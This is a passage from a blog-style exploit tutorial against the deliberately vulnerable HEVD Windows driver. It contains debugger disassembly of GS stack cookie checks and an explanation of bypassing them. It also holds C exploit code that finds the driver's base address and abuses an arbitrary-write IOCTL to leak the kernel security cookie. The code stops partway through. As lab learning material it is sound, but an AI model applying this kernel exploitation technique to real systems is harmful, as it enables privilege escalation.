+<p>All of that only to know that the stack cookie is stored in <code>rsp+0x220</code>. Thus, to complete the path for the BSOD, in the instruction inside the <code>HEVD!__security_check_cookie</code> function, if the Stack Cookie is not the predicted it will call to <code>__report_gsfailure</code>and set the BSOD value to <code>0xF7</code> (<code>fffff80757d21144</code>),</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>    HEVD!__security_check_cookie: CFG
+fffff807`57d21110 483b0de91e0000       cmp     rcx, qword ptr [HEVD!__security_cookie (fffff80757d23000)]
+fffff807`57d21117 7510                 jne     HEVD!__security_check_cookie&#43;0x19 (fffff80757d21129)
+fffff807`57d21119 48c1c110             rol     rcx, 10h
+fffff807`57d2111d 66f7c1ffff           test    cx, 0FFFFh
+fffff807`57d21122 7501                 jne     HEVD!__security_check_cookie&#43;0x15 (fffff80757d21125)
+fffff807`57d21124 c3                   ret     
+fffff807`57d21125 48c1c910             ror     rcx, 10h
+fffff807`57d21129 e902000000           jmp     HEVD!__report_gsfailure (fffff80757d21130)
+fffff807`57d2112e cc                   int     3
+fffff807`57d2112f cc                   int     3
+
+
+	HEVD!__report_gsfailure [minkernel\tools\gs_support\kmode\gs_report.c @ 37]:
+fffff807`57d21130 4883ec38        sub     rsp,38h
+fffff807`57d21134 488364242000    and     qword ptr [rsp&#43;20h],0
+fffff807`57d2113a 488bd1          mov     rdx,rcx
+fffff807`57d2113d 4c8b0dc41e0000  mov     r9,qword ptr [HEVD!__security_cookie_complement (fffff807`57d23008)]
+fffff807`57d21144 b9f7000000      mov     ecx,0F7h
+fffff807`57d21149 4c8b05b01e0000  mov     r8,qword ptr [HEVD!__security_cookie (fffff807`57d23000)]
+fffff807`57d21150 48ff15210f0000  call    qword ptr [HEVD!_imp_KeBugCheckEx (fffff807`57d22078)]
+fffff807`57d21157 0f1f440000      nop     dword ptr [rax&#43;rax]</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h3>x32 Bypass (EXP-301 Content)<span class="hx-absolute -hx-mt-20" id="x32-bypass-exp-301-content"></span>
+    <a href="#x32-bypass-exp-301-content" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>While researching about stack cookie I found a method in the OSED preparation exam to bypass it, the drawback is only for 0x86 Systems, but we are here to learn not only to show off a common LPE haha, so here you are what the OSED says about how to bypass StackCookie with SEH mechanism:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">Overwriting</span> <span class="n">an</span> <span class="n">exception</span> <span class="n">handler</span> <span class="n">and</span> <span class="n">causing</span> <span class="n">the</span> <span class="n">application</span> <span class="n">to</span> <span class="n">crash</span> <span class="n">in</span> <span class="n">any</span> <span class="n">way</span>
+</span></span><span class="line"><span class="cl"><span class="n">triggers</span> <span class="n">the</span> <span class="n">SEH</span> <span class="n">mechanism</span> <span class="n">and</span> <span class="n">causes</span> <span class="n">the</span> <span class="n">instruction</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">be</span> <span class="n">redirected</span>
+</span></span><span class="line"><span class="cl"><span class="n">to</span> <span class="n">the</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">exception_handler</span> <span class="n">prior</span> <span class="n">to</span> <span class="n">reaching</span> <span class="n">the</span> <span class="n">end</span> <span class="n">of</span> <span class="n">the</span>
+</span></span><span class="line"><span class="cl"><span class="n">vulnerable</span> <span class="n">function</span><span class="p">.</span> <span class="n">Because</span> <span class="n">of</span> <span class="n">this</span> <span class="n">increasing</span> <span class="n">the</span> <span class="n">size</span> <span class="n">of</span> <span class="n">a</span> <span class="n">stack</span> <span class="n">overflow</span> <span class="n">and</span>
+</span></span><span class="line"><span class="cl"><span class="n">overwriting</span> <span class="n">a</span> <span class="n">_EXCEPTION_REGISTRATION_RECORD</span> <span class="n">can</span> <span class="n">allow</span> <span class="n">an</span> <span class="n">attacker</span> <span class="n">to</span>
+</span></span><span class="line"><span class="cl"><span class="n">bypass</span> <span class="n">stack</span> <span class="n">cookies</span><span class="p">.</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>On 32-bit Windows, Structured Exception Handling (SEH) records were stored on the stack. That made them directly overwriteable via a stack buffer overflow, enabling the classic “SEH overwrite → pop/pop/ret → shellcode” technique.</p>
+<p>But why it doesnt works on x64 systems?</p>
+<ul>
+<li>SEH is no longer stack-based in the same way.</li>
+<li>Exception handling uses <strong>table-based unwinding</strong> driven by metadata (the <code>.pdata</code> / <code>.xdata</code> sections).</li>
+<li>The OS validates exception handlers against these tables.</li>
+</ul>
+<h2>Bypassing GS/Stack Cookie<span class="hx-absolute -hx-mt-20" id="bypassing-gsstack-cookie"></span>
+    <a href="#bypassing-gsstack-cookie" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>As we have seen, the <code>_security_cookie</code> is stores in the <code>.data</code> section of the driver, but we don&rsquo;t have to mix it with the <code>stack_cookie</code>.</p>
+<p>Thanks to <a href="https://flysand7.hashnode.dev/how-security-cookie-works" target="_blank" rel="noopener">flysand7</a>, we can understand better how security cookie works:</p>
+<p>The XOR operation has one interesting property that is important to us. When we xor the cookie and the return address, that value can be XOR’d with the return address and we should receive back the cookie (similarly it can be XOR’d with the cookie and we can get back the return address).</p>
+<p>This is exactly what the code does before calling <code>__check_security_cookie</code></p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">mov</span>  <span class="n">rcx</span><span class="p">,</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">120</span><span class="n">h</span><span class="p">]</span>         <span class="p">;</span> <span class="n">get</span> <span class="n">the</span> <span class="n">new</span> <span class="n">value</span>
+</span></span><span class="line"><span class="cl">  <span class="n">xor</span>  <span class="n">rcx</span><span class="p">,</span> <span class="n">rbp</span>                <span class="p">;</span> <span class="n">rcx</span> <span class="n">is</span> <span class="n">now</span> <span class="n">supposed</span> <span class="n">to</span> <span class="n">be</span> <span class="n">the</span> <span class="n">cookie</span>
+</span></span><span class="line"><span class="cl">  <span class="n">call</span> <span class="n">__security_check_cookie</span> <span class="p">;</span> <span class="n">check</span> <span class="n">rcx</span> <span class="k">for</span> <span class="k">if</span> <span class="n">it</span> <span class="n">is</span> <span class="n">the</span> <span class="n">cookie</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>The function <code>__security_check_cookie</code> has one parameter, which is the retrieved cookie. If the retrieved value is equal to <code>__security_cookie</code> then the check passes and no buffer overflow happened. Otherwise the check fails and that function proceeds to handle the situation.</p>
+<p>Thus, <code>_security_cookie</code> is in <code>HEVD+0x0867d8</code>:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>9: kd&gt; lm m  HEVD
+Browse full module list
+start             end                 module name
+fffff800`20600000 fffff800`2068c000   HEVD       (private pdb symbols)  C:\ProgramData\Dbg\sym\HEVD.pdb\A31BAF7C04024598B9D0BAEB8C4F26891\HEVD.pdb
+9: kd&gt; lm m  HEVD
+Browse full module list
+start             end                 module name
+fffff800`20600000 fffff800`2068c000   HEVD       (private pdb symbols)  C:\ProgramData\Dbg\sym\HEVD.pdb\A31BAF7C04024598B9D0BAEB8C4F26891\HEVD.pdb
+9: kd&gt; ? fffff800`206866e0-fffff800`20600000
+Evaluate expression: 550624 = 00000000`000866e0
+9: kd&gt; ? 0x866e0 &#43; 0xf8
+Evaluate expression: 550872 = 00000000`000867d8</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000140003000</span>     <span class="p">;</span> <span class="kt">uintptr_t</span> <span class="n">_security_cookie</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0000000140003000</span>     <span class="n">__security_cookie</span> <span class="n">dq</span> <span class="mi">2</span><span class="n">B992DDFA232h</span>      <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">__security_check_cookie</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>For the leak, if we try to read the content as usermode we will have the following erro:</p>
+<p><img src="image-5.png" alt="alt text" loading="lazy" /></p>
+<p>This would be the code if we have kernel-mode permissions:\</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;Header.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="nf">CreateFile</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Driver not found: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Driver handle: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">hevdBaseAddr</span> <span class="o">=</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;HEVD.sys&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Driver Base Address @ 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hevdBaseAddr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">securityCookie</span><span class="p">,</span> <span class="n">securityCookieAddr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">getSecurityCookie</span><span class="p">(</span><span class="n">hevdBaseAddr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">securityCookie</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">securityCookieAddr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] __security_cookie @ 0x%llX with value: 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">securityCookieAddr</span><span class="p">,</span> <span class="n">securityCookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buff</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;ASDAASD&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Sending A&#39;s buffer with a size of: 0x%zx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ULONGLONG</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">drvName</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">drivers</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">cbNeeded</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">nDrivers</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">EnumDeviceDrivers</span><span class="p">(</span><span class="n">drivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cbNeeded</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">cbNeeded</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WCHAR</span> <span class="n">szDrivers</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nDrivers</span> <span class="o">=</span> <span class="n">cbNeeded</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nDrivers</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">GetDeviceDriverBaseName</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">szDrivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nf">wcscmp</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">,</span> <span class="n">drvName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">getSecurityCookie</span><span class="p">(</span><span class="n">ULONG64</span> <span class="n">baseAddr</span><span class="p">,</span> <span class="n">PULONG64</span> <span class="n">securityValue</span><span class="p">,</span> <span class="n">PULONG64</span> <span class="n">securityAddr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">cookieAddr</span> <span class="o">=</span> <span class="n">baseAddr</span> <span class="o">+</span> <span class="n">SECURITY_COOKIE_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">securityCookie</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="o">*</span><span class="p">)</span><span class="n">cookieAddr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">securityAddr</span> <span class="o">=</span> <span class="n">cookieAddr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">securityValue</span> <span class="o">=</span> <span class="n">securityCookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h3>Exploiting ArbitraryRead for leak<span class="hx-absolute -hx-mt-20" id="exploiting-arbitraryread-for-leak"></span>
+    <a href="#exploiting-arbitraryread-for-leak" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>But we dont have, so we have to exploit an arbitrary read to obtain the security cookie:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">getSecurityCookie</span><span class="p">(</span><span class="n">ULONG64</span> <span class="n">baseAddr</span><span class="p">,</span> <span class="n">PULONG64</span> <span class="n">securityValue</span><span class="p">,</span> <span class="n">PULONG64</span> <span class="n">securityAddr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* Usermode sketch
+</span></span></span><span class="line"><span class="cl"><span class="cm">    ULONGLONG cookieAddr = baseAddr + SECURITY_COOKIE_OFFSET;
+</span></span></span><span class="line"><span class="cl"><span class="cm">    ULONGLONG securityCookie = *(ULONGLONG*)cookieAddr;
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">    *securityAddr = cookieAddr;
+</span></span></span><span class="line"><span class="cl"><span class="cm">    *securityValue = securityCookie;
+</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hFileLeak</span> <span class="o">=</span> <span class="nf">CreateFile</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hFileLeak</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[-] Driver not found: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] Driver Leak handle @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hFileLeak</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">PWRITE_WHAT_WHERE</span> <span class="n">inputBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWRITE_WHAT_WHERE</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">WRITE_WHAT_WHERE</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] Triggering Arbitrary Write to leak cookie...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">cookieAddrKrnl</span> <span class="o">=</span> <span class="n">baseAddr</span> <span class="o">+</span> <span class="n">SECURITY_COOKIE_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] Kernel Source (What): 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookieAddrKrnl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">inputBuffer</span><span class="o">-&gt;</span><span class="n">What</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="n">cookieAddrKrnl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">inputBuffer</span><span class="o">-&gt;</span><span class="n">Where</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="n">securityValue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] User Destination (Where): 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">securityValue</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">bytesReturned</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">status</span> <span class="o">=</span> <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFileLeak</span><span class="p">,</span> <span class="n">HEVD_IOCTL_ARBITRARY_WRITE</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">status</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[-] DeviceIoControl failed: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">securityAddr</span> <span class="o">=</span> <span class="n">cookieAddrKrnl</span><span class="p">;</span>
